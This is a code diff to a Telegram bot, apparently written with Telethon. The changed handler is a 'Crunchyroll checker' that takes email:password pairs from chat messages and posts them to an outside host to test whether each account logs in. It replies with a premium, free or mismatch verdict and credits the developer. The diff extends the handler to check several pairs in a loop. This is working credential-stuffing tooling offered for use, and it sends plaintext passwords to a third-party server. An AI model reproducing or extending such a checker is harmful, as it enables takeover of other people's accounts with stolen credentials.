@@ -13,12 +13,14 @@ ss = os.environ.get("STRING_SESSION")
 
 # Main
 
+
 def formatMessage(text):
     splited = text.split("\n")
     res = ""
     for each in splited:
         res += each.strip() + "\n"
     return res
+
 
 def fetchKeyword(keyword, source):
     return len(findall(rf"\b{keyword}\b", source)) >= 1
@@ -247,50 +249,55 @@ def main():
 
         @client.on(events.NewMessage(pattern=r"^(?:@xCatBurglar /crunchy|/crunchy)"))
         async def handler(event):
-            result = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
-            if not len(result) >= 1:
+            results = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
+            print(results)
+            if not len(results) >= 1:
                 return
-            result = result[0]
-            url = f"https://daydreamerwalk.com/c.php?e={result[0]}&p={result[1]}"
-            # Response from the server
-            response = requests.post(url=url)
-            # List of premium users
-            premium_users = ["x4rju9"]
-            # Membership status
-            memebership = "𝙵𝚁𝙴𝙴"
-            # Getting the sender infor to extract the username
-            user = await event.get_sender()
-            user = user.username
-            # Setting membership status based on the who accesses it
-            if user == "x4rju9":
-                memebership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
-            elif user in premium_users:
-                memebership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
-            # Password security: whether to hide or not
-            uPass = result[1]
-            if not event.is_private:
-                oLenght = len(uPass)
-                length = oLenght//2
-                uPass = uPass[0:length] + 'X'*(oLenght-length)
-            # Response of whether the credentials are valid or invalid
-            status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
-            if "premium" in response.text:
-                status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
-            else:
+            for result in results:
+                print(result)
+                url = f"https://daydreamerwalk.com/c.php?e={result[0]}&p={result[1]}"
+                # Response from the server
+                response = requests.post(url=url)
+                # List of premium users
+                premium_users = ["x4rju9"]
+                # Membership status
+                memebership = "𝙵𝚁𝙴𝙴"
+                # Getting the sender infor to extract the username
+                user = await event.get_sender()
+                user = user.username
+                # Setting membership status based on the who accesses it
+                if user == "x4rju9":
+                    memebership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
+                elif user in premium_users:
+                    memebership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
+                # Password security: whether to hide or not
                 uPass = result[1]
-            # Creating Response Format
-            res = f"""
-            [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
-            ━━━━━━━━━━━━━━━━
-            [✯] **ᴇᴍᴀɪʟ** ↯ `{result[0]}`
-            [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
-            [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
-            ━━━━━━━━━━━━━━━━
-            [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
-            [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{memebership}]
-            [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
-            res = formatMessage(res)
-            await event.reply(res)
+                # Response of whether the credentials are valid or invalid
+                status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
+                print(response.text)
+                if "premium" in response.text:
+                    status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
+                    if not event.is_private:
+                        oLenght = len(uPass)
+                        length = oLenght // 2
+                        uPass = uPass[0:length] + "X" * (oLenght - length)
+                        if len(uPass) > 20:
+                            uPass = uPass[0:20]
+                elif "good" in response.text:
+                    status = "ꜰʀᴇᴇ ᴀᴄᴄᴏᴜɴᴛ ✅"
+                # Creating Response Format
+                res = f"""
+                [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
+                ━━━━━━━━━━━━━━━━
+                [✯] **ᴇᴍᴀɪʟ** ↯ `{result[0]}`
+                [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
+                [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
+                ━━━━━━━━━━━━━━━━
+                [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
+                [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{memebership}]
+                [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
+                res = formatMessage(res)
+                await event.reply(res)
 
         # start bot
         client.start()
